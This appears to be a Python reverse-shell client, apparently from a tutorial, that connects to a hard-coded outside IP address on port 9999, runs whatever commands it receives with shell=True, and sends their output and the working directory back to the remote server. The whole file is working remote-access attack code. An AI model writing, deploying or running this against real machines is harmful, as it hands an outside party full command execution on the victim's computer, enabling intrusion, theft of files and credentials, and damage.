import socket
# to execute commands received
import os
import subprocess # Windows computer

s = socket.socket()
host = '104.236.192.137'
port = 9999

# to bind on a client
s.connect((host, port))

while True:
    data = s.recv(1024)
# to decode from byte to string
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
# to open up a terminal
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        # send output to server
        # display on client side
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")

        current_directory = os.getcwd() + "> "
        s.send(str.encode(output_str + current_directory))
        print(output_str) # to print on client's computer










